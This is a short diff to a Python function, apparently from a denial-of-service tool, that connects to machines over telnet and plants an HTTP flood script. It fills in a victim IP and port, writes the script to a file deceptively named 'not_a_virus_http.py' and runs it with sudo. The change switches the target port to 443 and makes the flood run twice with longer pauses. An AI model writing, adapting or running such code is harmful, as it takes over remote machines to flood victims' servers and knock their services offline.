@@ -90,10 +90,10 @@ def telnetConnect(ip_address, victimIP, attackType):
             if attackType == '3':
                 file = open('http_flood.txt', 'r')
                 strr = file.read()
-                newstrr = strr.replace("destination_host", 'imap.poczta.onet.pl')
+                newstrr = strr.replace("destination_host", 'none')
                 # newstr = newstrr.replace("destination_ip", '213.180.147.154')
                 newstr = newstrr.replace("destination_ip", victimIP)
-                str1 = newstr.replace('666', '143')
+                str1 = newstr.replace('666', '443')
                 file.close()
 
                 bfile = bytes(str1.encode())
@@ -101,7 +101,9 @@ def telnetConnect(ip_address, victimIP, attackType):
                 tn.write(b"touch not_a_virus_http.py\n")
                 tn.write(b'echo ' + b'"' + bfile + b'"' + b'>>' + b'not_a_virus_http.py' + b'\n')
                 tn.write(b"sudo python3 not_a_virus_http.py\n")
-                time.sleep(10)
+                time.sleep(60)
+                tn.write(b"sudo python3 not_a_virus_http.py\n")
+                time.sleep(60)
                 tn.write(b"ls\n")
                 tn.write(b"exit \n")
 
